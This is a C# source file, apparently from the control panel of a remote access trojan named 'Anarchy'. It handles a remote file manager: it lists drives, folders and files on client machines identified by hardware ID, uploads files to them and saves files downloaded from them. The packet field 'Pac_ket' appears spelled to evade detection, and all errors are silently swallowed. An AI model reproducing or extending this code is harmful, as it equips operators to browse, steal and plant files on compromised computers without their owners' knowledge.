using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Anarchy.Auth;
using Anarchy.Forms;
using Anarchy.Helpers.Helper;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class HandleFileManager
    {
        public async void FileManager(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "error":
                    {
                        FormFileManager formFileManager3;
                        formFileManager3 = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                        if (formFileManager3 != null)
                        {
                            formFileManager3.listView1.Enabled = true;
                            formFileManager3.toolStripStatusLabel3.ForeColor = Color.Red;
                            formFileManager3.toolStripStatusLabel3.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                        }
                        break;
                    }
                    case "reqUploadFile":
                    {
                        FormDownloadFile FD;
                        FD = (FormDownloadFile)Application.OpenForms[unpack_msgpack.ForcePathObject("ID").AsString];
                        if (FD != null)
                        {
                            FD.Client = client;
                            FD.timer1.Start();
                            MsgPack msgpack;
                            msgpack = new MsgPack();
                            msgpack.ForcePathObject("Pac_ket").AsString = "fileManager";
                            msgpack.ForcePathObject("Command").AsString = "uploadFile";
                            await msgpack.ForcePathObject("File").LoadFileAsBytes(FD.FullFileName);
                            msgpack.ForcePathObject("Name").AsString = FD.ClientFullFileName;
                            ThreadPool.QueueUserWorkItem(FD.Send, msgpack.Encode2Bytes());
                        }
                        break;
                    }
                    case "getPath":
                    {
                        FormFileManager FM;
                        FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                        if (FM != null)
                        {
                            FM.toolStripStatusLabel1.Text = unpack_msgpack.ForcePathObject("CurrentPath").AsString;
                            if (FM.toolStripStatusLabel1.Text.EndsWith("\\"))
                            {
                                FM.toolStripStatusLabel1.Text = FM.toolStripStatusLabel1.Text.Substring(0, FM.toolStripStatusLabel1.Text.Length - 1);
                            }
                            if (FM.toolStripStatusLabel1.Text.Length == 2)
                            {
                                FM.toolStripStatusLabel1.Text = FM.toolStripStatusLabel1.Text + "\\";
                            }
                            FM.listView1.BeginUpdate();
                            FM.listView1.Items.Clear();
                            FM.imageList1.Images.Clear();
                            FM.imageList1.Images.Add("0_folder", Image.FromStream(new MemoryStream(Convert.FromBase64String(""))));
                            FM.listView1.Groups.Clear();
                            FM.toolStripStatusLabel3.Text = "";
                            ListViewGroup groupFolder;
                            groupFolder = new ListViewGroup("Folders");
                            ListViewGroup groupFile;
                            groupFile = new ListViewGroup("Files");
                            FM.listView1.Groups.Add(groupFolder);
                            FM.listView1.Groups.Add(groupFile);
                            FM.listView1.Items.AddRange(await Task.Run(() => this.GetFolders(unpack_msgpack, groupFolder).ToArray()));
                            FM.listView1.Items.AddRange(await Task.Run(() => this.GetFiles(unpack_msgpack, groupFile, FM.imageList1).ToArray()));
                            FM.listView1.Enabled = true;
                            FM.listView1.Focus();
                            FM.listView1.EndUpdate();
                            FM.toolStripStatusLabel2.Text = $"       Folder[{FM.listView1.Groups[0].Items.Count}]   Files[{FM.listView1.Groups[1].Items.Count}]";
                        }
                        break;
                    }
                    case "getDrivers":
                    {
                        FormFileManager formFileManager2;
                        formFileManager2 = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                        if (formFileManager2 == null)
                        {
                            break;
                        }
                        formFileManager2.toolStripStatusLabel1.Text = "";
                        formFileManager2.listView1.Items.Clear();
                        string[] array;
                        array = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                        for (int num = 0; num < array.Length; num = num + 1 + 1)
                        {
                            if (array[num].Length > 0)
                            {
                                ListViewItem listViewItem;
                                listViewItem = new ListViewItem();
                                listViewItem.Text = array[num];
                                listViewItem.ToolTipText = array[num];
                                if (array[num + 1] == "Fixed")
                                {
                                    listViewItem.ImageIndex = 1;
                                }
                                else if (array[num + 1] == "Removable")
                                {
                                    listViewItem.ImageIndex = 2;
                                }
                                else
                                {
                                    listViewItem.ImageIndex = 1;
                                }
                                formFileManager2.listView1.Items.Add(listViewItem);
                            }
                        }
                        break;
                    }
                    case "setClient":
                    {
                        FormFileManager formFileManager;
                        formFileManager = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                        if (formFileManager != null && formFileManager.Client == null)
                        {
                            client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                            formFileManager.Client = client;
                            formFileManager.timer1.Enabled = true;
                        }
                        break;
                    }
                }
            }
            catch
            {
            }
        }

        public async void SocketDownload(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string asString;
                asString = unpack_msgpack.ForcePathObject("Command").AsString;
                if (!(asString == "pre"))
                {
                    if (!(asString == "save"))
                    {
                        return;
                    }
                    try
                    {
                        string asString2;
                        asString2 = unpack_msgpack.ForcePathObject("DWID").AsString;
                        FormDownloadFile SD;
                        SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + asString2];
                        if (SD != null && Directory.Exists(SD.DirPath))
                        {
                            string fileName;
                            fileName = unpack_msgpack.ForcePathObject("Name").AsString;
                            string dirPath;
                            dirPath = SD.DirPath;
                            if (File.Exists(dirPath + "\\" + fileName))
                            {
                                fileName = DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + "_" + fileName;
                                await Task.Delay(100);
                            }
                            await Task.Run(() => this.SaveFileAsync(unpack_msgpack.ForcePathObject("File"), dirPath + "\\" + fileName));
                            SD.Close();
                        }
                        return;
                    }
                    catch
                    {
                        return;
                    }
                    finally
                    {
                        GC.Collect();
                    }
                }
                string asString3;
                asString3 = unpack_msgpack.ForcePathObject("DWID").AsString;
                string asString4;
                asString4 = unpack_msgpack.ForcePathObject("File").AsString;
                string asString5;
                asString5 = unpack_msgpack.ForcePathObject("Size").AsString;
                FormDownloadFile formDownloadFile;
                formDownloadFile = (FormDownloadFile)Application.OpenForms["socketDownload:" + asString3];
                if (formDownloadFile != null)
                {
                    formDownloadFile.Client = client;
                    formDownloadFile.labelfile.Text = Path.GetFileName(asString4);
                    formDownloadFile.FileSize = Convert.ToInt64(asString5);
                    formDownloadFile.timer1.Start();
                }
            }
            catch
            {
            }
        }

        private async Task SaveFileAsync(MsgPack unpack_msgpack, string name)
        {
            await unpack_msgpack.SaveBytesToFile(name);
        }

        private List<ListViewItem> GetFolders(MsgPack unpack_msgpack, ListViewGroup listViewGroup)
        {
            string[] array;
            array = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
            List<ListViewItem> list;
            list = new List<ListViewItem>();
            int num;
            num = 0;
            for (int num2 = 0; num2 < array.Length; num2 = num2 + 1 + 1)
            {
                if (array[num2].Length > 0)
                {
                    ListViewItem listViewItem;
                    listViewItem = new ListViewItem();
                    listViewItem.Text = array[num2];
                    listViewItem.ToolTipText = array[num2 + 1];
                    listViewItem.Group = listViewGroup;
                    listViewItem.ImageIndex = 0;
                    list.Add(listViewItem);
                    num++;
                }
            }
            return list;
        }

        private List<ListViewItem> GetFiles(MsgPack unpack_msgpack, ListViewGroup listViewGroup, ImageList imageList1)
        {
            string[] _files;
            _files = unpack_msgpack.ForcePathObject("File").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
            List<ListViewItem> list;
            list = new List<ListViewItem>();
            for (int i = 0; i < _files.Length; i++)
            {
                if (_files[i].Length > 0)
                {
                    ListViewItem listViewItem;
                    listViewItem = new ListViewItem();
                    listViewItem.Text = Path.GetFileName(_files[i]);
                    listViewItem.ToolTipText = _files[i + 1];
                    Image im;
                    im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_files[i + 2])));
                    Login.form1.Invoke((MethodInvoker)delegate
                    {
                        imageList1.Images.Add(_files[i + 1], im);
                    });
                    listViewItem.ImageKey = _files[i + 1];
                    listViewItem.Group = listViewGroup;
                    listViewItem.SubItems.Add(Methods.BytesToString(Convert.ToInt64(_files[i + 3])));
                    list.Add(listViewItem);
                }
                i += 3;
            }
            return list;
        }
    }
}
